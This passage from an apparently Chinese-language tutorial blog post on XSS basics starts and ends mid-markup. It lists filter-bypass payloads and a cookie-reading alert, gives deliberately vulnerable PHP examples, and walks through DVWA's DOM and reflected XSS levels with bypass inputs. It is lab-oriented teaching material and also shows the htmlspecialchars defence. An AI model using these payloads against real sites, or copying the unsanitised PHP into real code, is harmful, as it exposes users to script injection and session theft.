src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;<br>// 在js中，我们可以用反引号代替单双引号<br></code></pre></td></tr></table></figure><p>6.JavaScript伪协议</p><p>“&gt;<a href="javascript:alert(/xss/)">                  o_n和<scr_ipt>过滤</scr_ipt></a></p><p>7.<strong>单引号闭合+htmlspecialchars函数绕过</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onmouseover=&#x27;alert(/xss/)<br><br></code></pre></td></tr></table></figure><p>8.编码绕过</p><p>常见的编码</p><ul><li>unicode编码</li><li>url编码</li><li>ascii编码</li><li>hex编码</li><li>base64编码</li></ul><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>源代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>反射型XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;action.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- &lt;form&gt;表示文档的服务器区域，此区域中包含一个Web站点的信息控件，用于向Web服务器区域提交 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br>//后端 action.php：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $name=$_POST[&quot;name&quot;]; </span><br><span class="hljs-meta">echo $name;</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>提交<script>alert('hack')</script></p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311202507690.png" alt="image-20230311202507690"></p><p>页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。</p><p>这就是最基本的 <strong>反射型的 XSS 漏洞</strong> ，这种漏洞数据流向是： <strong>前端–&gt;后端–&gt;前端</strong></p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>源代码</p><p>前端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>存储型XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;action2.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        输入你的ID：  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        输入你的Name：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>后端action2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;id&quot;</span>];<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>];<br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;insert into xss value (<span class="hljs-subst">$id</span>,&#x27;<span class="hljs-subst">$name</span>&#x27;)&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>后端show2.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mysql_connect</span>(<span class="hljs-string">&quot;locahost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from xss where id=1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311205234936.png" alt="image-20230311205234936"></p><p>我们输入 1 和 <code>&lt;script&gt;alert(\&#39;hack\&#39;)&lt;/script&gt;</code> ，注意，这里的 hack 的单引号要进行转义，因为 sql 语句中的 $name 是单引号的，所以这里不转义的话就会闭合 sql 语句中的单引号。</p><p>然后当其他用户访问 show2.php 页面时，我们插入的 XSS 代码就执行了。<br><strong>存储型 XSS</strong> 的数据流向是：<strong>前端–&gt;后端–&gt;数据库–&gt;后端–&gt;前端</strong></p><h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>low</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314111625701.png" alt="image-20230314111625701"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">/?default=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311211117713.png" alt="image-20230311211117713"></p><script>alert(document.cookie)</script> #可以弹出cookie<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311211336184.png" alt="image-20230311211336184"></p><p>medium</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>array_key_exists — 检查数组里是否有指定的键名或索引</p><p>stripos — 查找字符串首次出现的位置（不区分大小写）</p><p>此处过滤了&lt;script 使用img标签&lt;img src&#x3D;1 οnerrοr&#x3D;(‘xss’)&gt;发现没有任何弹窗</p><p>发现已经插入了value属性中。我们需要插入到值中，那么可以闭合select和option标签来插入。</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113530028.png" alt="image-20230314113530028"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">?default=<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br>?default=<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113613135.png" alt="image-20230314113613135"></p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113232825.png" alt="image-20230314113232825"></p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314112958648.png" alt="image-20230314112958648"></p><p>high</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>白名单过滤，只能选择四种语言</p><p>这里可以采用#方法来绕过服务器端的业务操作</p><p>#是一个浏览器指导字符，该字符后面的的数据不会被传到服务器后端，所以可以通过该符号来绕过后端代码的过滤，可以直接与浏览器进行交互</p><p>注意：#这个方法仅适用于DOM型<a href="https://so.csdn.net/so/search?q=xss&spm=1001.2101.3001.7020">xss</a>注入)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">#<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314214536278.png" alt="image-20230314214536278"></p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215331489.png" alt="image-20230314215331489"></p><p>impossible</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215622412.png" alt="image-20230314215622412"></p><p>不进行url编码</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215737945.png" alt="image-20230314215737945"></p><p>high:<option value="" + lang + "">“ + decodeURI(lang) + “</option></p><p>impossible:<option value="" + lang + "">“ + (lang) + “</option></p><h3 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311211432135.png" alt="image-20230311211432135"></p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);  <span class="hljs-comment"># 未进行xss过滤</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123; <span class="hljs-comment"># 未进行过滤</span><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>medium</p><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);   <span class="hljs-comment"># 禁用xss过滤器</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );   <span class="hljs-comment">#使用str_replace函数进行替换</span><br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>str_replace — 子字符串替换，区分大小写</p><p>使用大小写过滤</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311212248550.png" alt="image-20230311212248550"></p><p>high</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>preg_replace — 执行一个正则表达式的搜索和替换</p><p>添加了对大小写绕过的判断，而且根据正则表达式过滤，提交内容只要有script顺序出现的字母都一律过滤掉，只是过滤了script标签，但是有一些javascript事件后仍然能执行javascript代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311214122921.png" alt="image-20230311214122921"></p><p>impossible</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。</p><ul><li>某类字符在 HTML 中有特殊用处，如需保持原意，需要用 HTML 实体来表达。 本函数会返回字符转义后的表达。 如需转换子字符串中所有关联的名称实体，使用 <a href="https://www.php.net/manual/zh/function.htmlentities.php">htmlentities()</a> 代替本函数。</li></ul><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311214358573.png" alt="image-20230311214358573"></p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span 